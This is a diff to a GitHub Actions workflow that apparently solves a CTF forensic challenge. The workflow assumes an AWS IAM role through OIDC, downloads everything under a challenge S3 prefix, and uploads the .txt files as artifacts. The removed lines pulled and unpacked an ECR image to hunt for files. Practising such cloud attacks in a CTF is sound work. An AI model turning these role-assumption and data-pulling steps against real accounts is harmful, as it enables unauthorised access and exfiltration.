@@ -13,33 +13,15 @@ jobs:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: ap-east-1
           role-session-name: OIDCSession
-      - name: List ECR repositories
+      - name: List S3 objects
         run: |
-          aws ecr describe-repositories --region ap-east-1
-      - name: Login to ECR
+          aws s3 ls s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/ --recursive
+      - name: Download files from S3
         run: |
-          aws ecr get-login-password --region ap-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com
-      - name: Pull and inspect image
-        run: |
-          REPO=$(aws ecr describe-repositories --region ap-east-1 --query 'repositories[0].repositoryName' --output text)
-          if [ "$REPO" != "None" ]; then
-            echo "Repository found: $REPO"
-            docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$REPO:latest
-            docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$REPO:latest -o image.tar
-            tar -xf image.tar
-            find . -name "rockyou.txt" -type f -exec cp {} ./ \;
-            find . -name "*.txt" -type f -exec cat {} \; || true
-          else
-            echo "No ECR repositories found"
-          fi
-      - name: Download from S3
-        run: |
-          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/output.txt ./ || echo "No output.txt"
-          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/rockyou.txt ./ || echo "No rockyou.txt"
+          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/ ./ --recursive
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: extracted-files
+          name: s3-files
           path: |
-            rockyou.txt
-            output.txt
+            *.txt
